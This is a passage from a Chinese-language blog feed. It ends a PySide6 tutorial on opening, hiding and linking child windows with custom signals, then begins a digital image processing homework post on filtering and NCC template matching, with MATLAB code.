Windows）</strong></p><p>多窗口指的是独立的、可以同时运行的多个窗口。在多窗口应用中，每个窗口都可以独立执行操作，而不一定要依赖于主窗口。多窗口的特点包括：</p><ol><li><strong>独立性</strong>：每个窗口都是独立的实例，可以单独打开、关闭，而不影响其他窗口。</li><li><strong>功能分离</strong>：每个窗口可以承担不同的任务，功能之间的独立性较强。</li><li><strong>用户交互</strong>：用户可以同时与多个窗口交互，窗口之间可能有或没有数据和事件的交互。</li><li><strong>生命周期管理</strong>：每个窗口可能有自己的生命周期管理，关闭一个窗口不会影响其他窗口。</li></ol><h3 id="创建子窗口"><a href="#创建子窗口" class="headerlink" title="创建子窗口"></a>创建子窗口</h3><p>与主窗口一样，子窗口需要我们再继承一个窗口的类</p><p>而在父窗口的部分实例化子窗口的类</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line">        self.lb = QLabel(<span class="string">&#x27;这个是主窗口&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        self.subWindow = SubWindow()</span><br><span class="line">        self.subWindow.show()</span><br><span class="line">        </span><br><span class="line">        self.mainlayout = QVBoxLayout()</span><br><span class="line">        self.mainlayout.addWidget(self.lb)</span><br><span class="line">        self.setLayout(self.mainlayout)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.lb = QLabel(<span class="string">&#x27;这个是子窗口&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        self.mainlayout = QVBoxLayout()</span><br><span class="line">        self.mainlayout.addWidget(self.lb)</span><br><span class="line">        self.setLayout(self.mainlayout)</span><br></pre></td></tr></table></figure><p>实例化子窗口后，我们通过<code>show()</code>方法来展示</p><div class="note warning flat"><p>当在主窗口中定义子窗口的实例时，一定要将其定义为self的变量，否则它将会在展示的一瞬间被垃圾回收机制给回收</p></div><h3 id="窗口的开闭"><a href="#窗口的开闭" class="headerlink" title="窗口的开闭"></a>窗口的开闭</h3><p>在 PySide6 中，<code>show()</code>, <code>close()</code>, 和 <code>hide()</code> 是窗口对象常用的几个方法，用于控制窗口的可见性和生命周期。</p><ol><li><p><code>show()</code></p><ul><li><strong>用法</strong>：<code>show()</code> 方法用于显示窗口。如果一个窗口是新创建的或者之前被隐藏了，使用 <code>show()</code> 可以使其变为可见状态。</li><li><strong>场景</strong>：这个方法通常在窗口首次初始化之后调用，或者在窗口被隐藏之后需要再次显示时调用。</li></ul></li><li><p><code>close()</code></p><ul><li><strong>用法</strong>：<code>close()</code> 方法用于关闭窗口。这不仅会隐藏窗口，而且会触发窗口的关闭事件（<code>closeEvent</code>），可以在其中执行一些清理操作。</li><li><strong>场景</strong>：当你想要结束窗口的生命周期时，例如用户完成了操作，或者不再需要显示该窗口时，可以调用 <code>close()</code>。对于子窗口，<code>close()</code> 会使其从父窗口的子窗口列表中移除。</li><li><strong>注意</strong>：关闭主窗口通常会导致整个应用程序退出。</li></ul></li><li><p><code>hide()</code></p><ul><li><strong>用法</strong>：<code>hide()</code> 方法用于临时隐藏窗口，而不是关闭。窗口仍然存在于内存中，但用户界面上不可见。</li><li><strong>场景</strong>：当你想临时从视图中移除窗口，但可能稍后需要重新显示它时，使用 <code>hide()</code> 是合适的。这对于不想终止窗口实例，而只是暂时不显示它的情况很有用。</li></ul></li></ol><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>我们将关闭、显示、隐藏子窗口的按钮集成到主窗口中，方便进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line">        self.lb = QLabel(<span class="string">&#x27;这个是主窗口&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        self.subWindow = SubWindow()</span><br><span class="line">        self.subWindow.show()</span><br><span class="line"></span><br><span class="line">        self.btnClose = QPushButton(<span class="string">&#x27;关闭子窗口&#x27;</span>)</span><br><span class="line">        self.btnClose.clicked.connect(<span class="keyword">lambda</span>: self.subWindow.close())</span><br><span class="line">        </span><br><span class="line">        self.btnShow = QPushButton(<span class="string">&#x27;显示子窗口&#x27;</span>)</span><br><span class="line">        self.btnShow.clicked.connect(<span class="keyword">lambda</span>: self.subWindow.show())</span><br><span class="line"></span><br><span class="line">        self.btnHide = QPushButton(<span class="string">&#x27;隐藏子窗口&#x27;</span>)</span><br><span class="line">        self.btnHide.clicked.connect(<span class="keyword">lambda</span>: self.subWindow.hide())</span><br><span class="line"></span><br><span class="line">        self.mainlayout = QVBoxLayout()</span><br><span class="line">        self.mainlayout.addWidget(self.lb)</span><br><span class="line">        self.mainlayout.addWidget(self.btnClose)</span><br><span class="line">        self.mainlayout.addWidget(self.btnShow)</span><br><span class="line">        self.mainlayout.addWidget(self.btnHide)</span><br><span class="line">        self.setLayout(self.mainlayout)</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">SubWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.lb = QLabel(<span class="string">&#x27;这个是子窗口&#x27;</span>)</span><br><span class="line">        self.lineEdit = QTextEdit()</span><br><span class="line">        self.lineEdit.setText(<span class="string">&#x27;这是子窗口的文本框&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        self.mainlayout = QVBoxLayout()</span><br><span class="line">        self.mainlayout.addWidget(self.lb)</span><br><span class="line">        self.mainlayout.addWidget(self.lineEdit)</span><br><span class="line">        self.setLayout(self.mainlayout)</span><br></pre></td></tr></table></figure><p>下面是测试效果</p><img src="/posts/d765094b05e7/2023-12-13-11-34-33.gif" class="" title="2023-12-13-11-34-33"><p>可以发现，当我们关闭子窗口并重新展示后，子窗口会回到一个固定的地方，这说明原来的子窗口被彻底清除，重新创建了一个子窗口；而当我们将子窗口隐藏后重新展示时，子窗口仍然在隐藏前的地方。</p><h3 id="自定义信号"><a href="#自定义信号" class="headerlink" title="自定义信号"></a>自定义信号</h3><p>通常自定义一个信号时共有以下<strong>三个步骤</strong></p><ol><li><p>定义信号名以及传参类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">From Pyside6.QtCore <span class="keyword">import</span> Signal</span><br><span class="line">signalname = Signal(<span class="built_in">object</span>)</span><br></pre></td></tr></table></figure><p>这里的参数类型除了object对象，还可以是str、int等等</p><div class="note warning flat"><p>信号需要在窗口类中定义，而非<code>__init__</code>函数中</p></div></li><li><p>将信号绑定到槽</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signalname.connect(function)</span><br></pre></td></tr></table></figure><p><code>connect()</code>中绑定的槽会接收信号传递的参数</p></li><li><p>发送(激活)信号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">signalname.emit(signal)</span><br></pre></td></tr></table></figure><p><code>emit()</code>方法中的参数即希望信号传递的参数</p></li></ol><h3 id="父子窗口间通信"><a href="#父子窗口间通信" class="headerlink" title="父子窗口间通信"></a>父子窗口间通信</h3><p>父子窗口间通信很大程度上需要依赖自定义信号</p><p>但更重要的是，如何在父窗口中操作子窗口，以及如何在子窗口中操作父窗口</p><p>在<strong>父窗口操作子窗口可以直接通过调用定义的子窗口对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sendValueToSub = Signal(<span class="built_in">str</span>)</span><br><span class="line">self.subWindow = SubWindow(self)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">    self.sendValueToSub.connect(self.subWindow.lineEditSub.setText)</span><br><span class="line">    self.btn.clicked.connect(self.sendValue)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendValue</span>(<span class="params">self</span>):</span><br><span class="line">    self.sendValueToSub.emit(self.lineEditMain.text())</span><br></pre></td></tr></table></figure><p>在上述代码中，父窗口直接将<code>subWindow</code>的控件的方法设为槽</p><p>那么接下来的重点是如何让子窗口获取父窗口的对象</p><p>我们可以<strong>在定义子窗口对象时将父窗口本身传入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">self.subWindow = SubWindow(self)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    sendValueToMain = Signal(<span class="built_in">str</span>)  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,parent=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line"></span><br><span class="line">        self.parent = parent</span><br><span class="line"></span><br><span class="line">        self.lineEditSub = QLineEdit()</span><br><span class="line">        self.btn = QPushButton(<span class="string">&#x27;发送数据到主窗口&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        self.mainlayout = QVBoxLayout()</span><br><span class="line">        self.mainlayout.addWidget(self.lineEditSub)</span><br><span class="line">        self.mainlayout.addWidget(self.btn)</span><br><span class="line">        self.setLayout(self.mainlayout)</span><br><span class="line">        self.bind()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">        self.sendValueToMain.connect(self.parent.lineEditShow.setText)</span><br><span class="line">        self.btn.clicked.connect(self.sendValue)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendValue</span>(<span class="params">self</span>):</span><br><span class="line">        self.sendValueToMain.emit(self.lineEditSub.text())</span><br></pre></td></tr></table></figure><p>我们在定义子窗口的初始化函数时额外定义一个<code>parent</code>参数</p><p>在创建子窗口对象时通过<code>SubWindow(self)</code>将父窗口传入</p><p>之后我们就能通过<code>self.parent = parent</code></p><p>在子窗口的初始化函数中初始化一个父窗口的属性</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> note </tag>
            
            <tag> GUI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字图像处理 作业二</title>
      <link href="/posts/d3efec41afb2/"/>
      <url>/posts/d3efec41afb2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本系列文章为学校课程《数字图像处理》布置的一些小project作业</p><p>除了给出每个问题的解答和代码，我也会附上相关知识点，以方便后续复习</p><h1 id="前置概念"><a href="#前置概念" class="headerlink" title="前置概念"></a>前置概念</h1><h2 id="信号频率与噪声"><a href="#信号频率与噪声" class="headerlink" title="信号频率与噪声"></a>信号频率与噪声</h2><p>一个信号通常是由低频和高频部分组成</p><p><strong>低频组成部分</strong>：平滑或逐段平滑的区域，邻近像素亮度值相似。</p><p><strong>高频组成部分</strong>：震荡性强的区域，邻近像素亮度值不同，通常在边缘或噪声点处。</p><p>下面是一个明显的例子</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231112142919890.png" alt="image-20231112142919890"></p><p>那么我们已经知道高频信号经常是图片中的噪声，也就顺理成章地能想到一种去噪方法</p><p>那就是<strong>将图像中噪声集中的频率过滤掉</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231112145659608.png" alt="image-20231112145659608"></p><p>深入研究去噪方法前，我们先来了解有哪些常见的噪声</p><ol><li><strong>盐和胡椒噪声（Salt-and-Pepper Noise）</strong>：<ul><li><strong>特点</strong>：这种噪声呈现为图像中随机分布的黑白像素点。</li><li><strong>产生原因</strong>：通常由图像传感器、传输错误或由于数据损坏等原因引起。</li><li><strong>表现</strong>：图像中出现的黑点（”胡椒”）和白点（”盐”）。</li></ul></li><li><strong>脉冲噪声（Impulse Noise）</strong>：<ul><li><strong>特点</strong>：类似于盐和胡椒噪声，但通常只包括单一色彩的像素点（通常是白色）。</li><li><strong>产生原因</strong>：可能由图像传感器的故障、传输过程中的错误或其他技术问题导致。</li><li><strong>表现</strong>：图像中随机分布的明亮像素点。</li></ul></li><li><strong>高斯噪声（Gaussian Noise）</strong>：<ul><li><strong>特点</strong>：这种噪声的幅度遵循高斯分布（正态分布），即噪声值的分布呈钟形曲线。</li><li><strong>产生原因</strong>：可以由多种原因产生，包括传感器噪声、电子电路噪声、热噪声等。</li><li><strong>表现</strong>：在整个图像中平均分布，通常看起来像是图像的粒状或轻微模糊。</li></ul></li></ol><h2 id="空域滤波"><a href="#空域滤波" class="headerlink" title="空域滤波"></a>空域滤波</h2><p>数字图像处理中的滤波是一种用于增强、恢复、平滑或检测图像中的特定特征的技术。</p><p>它的思想是利用四周的像素点信息，即<strong>将像素点的值替换为该像素及其领域的函数值</strong></p><p>主要用途有以下几个方面：</p><ol><li><strong>去噪声</strong>：图像通常会因为各种原因（如传感器缺陷、传输错误等）含有噪声。滤波器可以帮助去除或减少这些噪声。</li><li><strong>锐化和边缘增强</strong>：滤波可以用来增强图像中的边缘，从而使图像看起来更清晰。</li><li><strong>平滑和模糊</strong>：通过滤波可以对图像进行平滑处理，这在去除噪声或降低图像细节方面非常有用。</li><li><strong>特征提取</strong>：特定类型的滤波器能够帮助识别图像中的某些特征，如直线、圆形等。</li><li><strong>检测图像</strong>：例如模板匹配</li></ol><p>滤波器可以是线性的，也可以是非线性的。线性滤波器包括高通滤波器、低通滤波器、带通滤波器等，常见的如高斯滤波器、均值滤波器。非线性滤波器则包括中值滤波器、双边滤波器等。不同的滤波器有着不同的用途和效果。</p><h3 id="线性滤波"><a href="#线性滤波" class="headerlink" title="线性滤波"></a>线性滤波</h3><p>滤波值是相邻像素值的线性组合，具有线性和移位不变性的特点</p><p><strong>线性</strong>：$filter(f+g)=filter(f)+filter(g)$</p><p><strong>移位不变性</strong>：滤波器对输入的移位保持不变，$filter(shift(f)) = shift(filter(f))$</p><p>我们可以从一个最简单的滤波入手，即均值滤波</p><script type="math/tex; mode=display">b_{\text{smooth}}[i] = \frac{1}{2r+1} \sum_{j=i-r}^{i+r} b[j]</script><p>在均值滤波中，每个样本（即四周的像素点）都有相同的权重</p><p>那么事实上，我们可以把<strong>卷积</strong>看作一个<strong>移动加权均值滤波</strong></p><script type="math/tex; mode=display">(a \ast b)[i] = \sum_j a[j]b[i - j]</script><p>其中权值序列$a[j]$也可以叫做<strong>滤波器</strong></p><p>当然在运算时，线性滤波还有一些属性</p><ul><li><strong>交换律（Commutative）</strong>：$a <em> b = b </em> a$，这表示线性滤波器可以与信号以任意顺序结合，而不会影响最终结果。在图像处理中，这意味着不管是先对图像进行滤波还是先考虑图像中的某个特定区域，其结果是相同的。</li><li><strong>结合律（Associative）</strong>：$a <em> (b + c) = (a </em> b) + (a * c)$，这表明多个线性滤波器可以串联使用，它们的组合效果与应用单个综合滤波器的效果是等同的。例如，如果有三个不同的滤波器要应用于图像，你可以先计算这三个滤波器的组合，然后将其应用于图像，这与依次应用每个滤波器的结果相同。</li><li><strong>分配律（Distributive over addition）</strong>：$a <em> (b + c) = (a </em> b) + (a * c)$，这意味着如果你有两个图像或信号需要合并，你可以先对每个图像独立进行滤波，然后再将它们相加，这与将这两个图像首先相加，然后对结果图像进行滤波，得到的结果是一样的。</li><li><strong>标量因子（Scalars factor out）</strong>：$k \cdot (a <em> b) = (k \cdot a) </em> b = a * (k \cdot b)$，在滤波操作中，可以提前将标量（即常数因子）与滤波器或信号相乘，或者在滤波操作后再乘以标量，最终结果不会改变。</li><li><strong>恒等元素（Identity）</strong>：$a * e = a \quad \text{where} \quad e = [\ldots, 0, 0, 1, 0, 0, \ldots]$，在线性滤波的上下文中，单位脉冲（一个中心为1，其他地方为0的滤波器）不会改变图像，这意味着图像经过这样的滤波器后保持不变</li></ul><h4 id="常见滤波器"><a href="#常见滤波器" class="headerlink" title="常见滤波器"></a>常见滤波器</h4><ol><li><p><strong>方框滤波器</strong>：简单且便宜的低通滤波器。</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231112164537351.png" alt="image-20231112164537351"></p></li><li><p><strong>帐篷滤波器</strong>：线性插值。</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231112164551705.png" alt="image-20231112164551705"></p></li><li><p><strong>高斯滤波器</strong>：非常平滑的抗锯齿低通滤波器。</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231112164601168-16997787655381.png" alt="image-20231112164601168"></p></li></ol><h4 id="相关滤波"><a href="#相关滤波" class="headerlink" title="相关滤波"></a>相关滤波</h4><p>以上描述都是基于一维空间上的滤波，而对于图像处理，我们需要用到二维空间的滤波</p><p><strong>在相关滤波中，滤波器也被称为模板(template)或核(kernel)</strong></p><ol><li>如果滤波器对称，即h(u,v)=h(-u,-v), 则卷积滤波和相关滤波等价 </li><li>将相关滤波器h(u,v)按中心逆时针旋 转180度再作卷积，和相关滤波具有等价效果 </li><li>使用卷积是为了应用有关频域处理卷积定理</li></ol><p>相关滤波和卷积的公式区别如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113110005836.png" alt="image-20231113110005836"></p><div class="note warning flat"><p>在相关匹配时，一定要归一化，否则可能出现错误结果</p></div><h4 id="模板匹配"><a href="#模板匹配" class="headerlink" title="模板匹配"></a>模板匹配</h4><p>相关滤波的一种应用是<strong>模板匹配</strong></p><div class="note info flat"><p><strong>模板匹配</strong>是一种在整个图像中寻找与给定子图像（称为“模板”或“目标”）匹配的区域的技术。这个过程涉及在目标图像上滑动模板图像，并在每个位置计算模板图像和它覆盖的目标图像区域之间的相似度。模板匹配广泛应用于机器视觉和图像处理领域，用于定位和识别对象、追踪移动物体、场景重建以及许多其他任务。</p></div><p>模板匹配通过将模板图像在大图像上滑动，并在每个位置计算两者之间的相关性,相似度最高的区域被认为是模板的匹配位置。</p><p>相关的计算是通过将图像元素和⼦模式图像元素联系起来获得的，将相关元素相乘后累加。我们完全可以将⼦图像w视为⼀个按⾏或按列存储的向量 ，将计算过程中被w覆盖的图像区域视为另⼀个按照同样的⽅式存储的向量 。这样一来，<strong>相关计算</strong>就成了向量之间的<strong>点积运算</strong>。</p><p>两个向量的点积为：</p><script type="math/tex; mode=display">\vec{a} \cdot \vec{b} = |\vec{a}| |\vec{b}| \cos \theta \quad</script><p>其中，θ为向量$  \vec{a} $ 、 $ \vec{b} $ 之间的夹⻆。显然，当 $ \vec{a} $ 和 $ \vec{b} $ 具有完全相同的⽅向（平⾏）时，cosθ=1，从⽽式子取得其最⼤值 ，这就意味着当图像的局部区域类似于⼦图像模式时，相关运算产⽣最⼤的响应。然⽽，公式最终的取值还与向量 $\vec{a} $ 、 $ \vec{b} $ ⾃⾝的模有关，这将导致按照公式计算的相关响应存在着对f和w的灰度幅值⽐较敏感的缺陷。这样⼀来，在f的⾼灰度区域，可能尽管其内容与⼦图像w的内容并不相近，但由于 $  \left| {\vec{a}} \right| $⾃⾝较⼤⽽同样产⽣⼀个很⾼的响应。可通过对向量以其模值来归⼀化从⽽解决这⼀问题，即通过$\frac{\vec{a} \cdot \vec{b}}{|\vec{a}| |\vec{b}|}$来计算相关。</p><h4 id="高斯低通滤波"><a href="#高斯低通滤波" class="headerlink" title="高斯低通滤波"></a>高斯低通滤波</h4><p>高斯滤波的思想是让相邻像素点对函数值有更大的影响</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113103406936.png" alt="image-20231113103406936"></p><p><strong>高斯函数</strong>是一个非常重要的平滑函数，它在二维空间中的形式是：</p><script type="math/tex; mode=display">G(x, y) = \frac{1}{2\pi\sigma^2}e^{-\frac{x^2 + y^2}{2\sigma^2}}</script><p>这里的 $x$ 和 $y$代表了离中心像素的距离，$σ$ 是控制“钟形”曲线宽度的标准差。</p><p>其效果是让图片变得更加平滑</p><p>高斯低通滤波器的一个关键参数是标准差 $σ$。当 $σ$较小时，高斯核的宽度较小，滤波效果较弱，保留了更多的高频信息（即细节）。相反，当  $σ$较大时，高斯核的宽度较大，滤波效果较强，从而产生更强的模糊效果。</p><p>下面是不同标准差下产生的效果</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113103832776.png" alt="image-20231113103832776"></p><h4 id="锐化"><a href="#锐化" class="headerlink" title="锐化"></a>锐化</h4><p>锐化的滤波器核为一个冲激I 减去一个平滑滤波器g</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113110353224.png" alt="image-20231113110353224"></p><p>效果如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113110427951.png" alt="image-20231113110427951"></p><h3 id="非线性滤波"><a href="#非线性滤波" class="headerlink" title="非线性滤波"></a>非线性滤波</h3><h4 id="中值滤波"><a href="#中值滤波" class="headerlink" title="中值滤波"></a>中值滤波</h4><p>中值滤波会<strong>选取滑动窗口中的中间值</strong>作为函数结果</p><p>相比于高斯低通滤波，中值滤波有<strong>对异常值的稳健性</strong>，同时也具有边缘保护功能</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113110755683.png" alt="image-20231113110755683"></p><p>当然，它还有一个特点，即<strong>非线性</strong></p><p>一个通用定义为在领域p中选取中间值</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231113111108890.png" alt="image-20231113111108890"></p><p>当我们想要对彩色图像进行中值滤波时，可以考虑<strong>向量中值滤波</strong></p><p><strong>向量中值滤波算法:</strong> </p><p>设$X_1,X_2,\ldots,X_N \in \mathbb{R}^k$是对应滤波器窗口的输入向量，计算每个向量$x_i$到其他向量的距离和： </p><script type="math/tex; mode=display">S(X_i) = \sum_{j=1, j \neq i}^{N} \| X_i - X_j \|_L</script><p>其中$| \cdot |_L$为 1-或者 2-范数，寻找 $s(X_i)$的最小值，并作为向量中值滤波的输出</p><h1 id="HW1-模板匹配"><a href="#HW1-模板匹配" class="headerlink" title="HW1 模板匹配"></a>HW1 模板匹配</h1><p>作业要求：</p><blockquote><p>给定图像car.png和模版图像wheel.png，利用相关检测实现对car图像中的wheel检测，具有最大相关值的位置可以解释为所检测到的wheel位置。程序的输入是图像和模版，要求： </p><p>（i）显示图像的相关值结果； </p><p>（ii）列出在图像中检测到的所有目标的（x，y）坐标。 </p></blockquote><p>在模板匹配的算法上，我们选用<strong>互相关匹配(Normalized Cross Correlation，NCC）</strong></p><p>它的一个特点是<strong>在光照方面受的影响比较小</strong>，所以当检测图像亮度和形状变化很大时还是能够匹配得到。</p><p>回顾PPT</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231112195938795.png" alt="image-20231112195938795"></p><p>该公式为</p><script type="math/tex; mode=display">\rho(x, y) = \frac{    \sum\limits_{k = -\frac{M}{2}}^{\frac{M}{2}} \sum\limits_{l = -\frac{N}{2}}^{\frac{N}{2}} f(x + k, y + l) \cdot T\left(\frac{M}{2} + k, \frac{N}{2} + l\right) }{    \sqrt{        \sum\limits_{k = -\frac{M}{2}}^{\frac{M}{2}} \sum\limits_{l = -\frac{N}{2}}^{\frac{N}{2}} f(x + k, y + l)^2    }    \sqrt{        \sum\limits_{k = -\frac{M}{2}}^{\frac{M}{2}} \sum\limits_{l = -\frac{N}{2}}^{\frac{N}{2}} T\left(\frac{M}{2} + k, \frac{N}{2} + l\right)^2    } }</script><p>事实上，我们可以将每个点的计算过程<strong>看作两个向量相乘</strong></p><p>即<script type="math/tex">\vec{a} \cdot \vec{b} = |\vec{a}| |\vec{b}| \cos \theta \quad</script></p><p>模板视为⼀个按⾏或按列存储的向量 $\vec{a}$，而计算过程中被w覆盖的图像区域视为另⼀个按照同样的⽅式存储的向量 $\vec{b}$</p><p>此时我们想要找到最大相关性，即计算$cos\theta =\frac{\vec{a} \cdot \vec{b}}{|\vec{a}| |\vec{b}|}$，寻找最大的$cos\theta$值</p><p>接下来开始实现算法</p><p>首先读取被匹配图像和模版图像，并获取尺寸</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">car_img = imread(<span class="string">&#x27;car.png&#x27;</span>);</span><br><span class="line">wheel_img = imread(<span class="string">&#x27;wheel.png&#x27;</span>);</span><br><span class="line">[carHeight, carWidth] = <span class="built_in">size</span>(car_img);</span><br><span class="line">[wheelHeight, wheelWidth] = <span class="built_in">size</span>(wheel_img);</span><br></pre></td></tr></table></figure><p>将原图像的四周扩展补充为白色</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">padded_img = padarray(car_img, [(wheelHeight - <span class="number">1</span>)/<span class="number">2</span>, (wheelWidth - <span class="number">1</span>)/<span class="number">2</span>], <span class="string">&#x27;both&#x27;</span>);</span><br><span class="line">corrMatrix = <span class="built_in">zeros</span>(carHeight - wheelHeight + <span class="number">1</span>, carWidth - wheelWidth + <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>计算相关性时，直接<strong>利用向量乘积</strong></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span>:<span class="built_in">size</span>(car_img, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">j</span> = <span class="number">1</span>:<span class="built_in">size</span>(car_img, <span class="number">2</span>)</span><br><span class="line">        <span class="comment">% 提取当前窗口</span></span><br><span class="line">        window = double(padded_img(<span class="built_in">i</span>:<span class="built_in">i</span>+wheelHeight<span class="number">-1</span>, <span class="built_in">j</span>:<span class="built_in">j</span>+wheelWidth<span class="number">-1</span>));</span><br><span class="line">        <span class="comment">% 计算相关性</span></span><br><span class="line">        a = double(wheel_img(:));</span><br><span class="line">        b = window(:);</span><br><span class="line">        correlation_matrix(<span class="built_in">i</span>, <span class="built_in">j</span>) = (a&#x27; * b) / (norm(a) * norm(b));</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>需要注意的是，在最后<strong>需要除以向量的模norm来归一化</strong></p><p>最后，将相关性矩阵以图像的形式输出，我们就得到了图像的相关值结果</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">figure</span>, </span><br><span class="line">imshow(correlation_matrix, []), </span><br><span class="line">title(<span 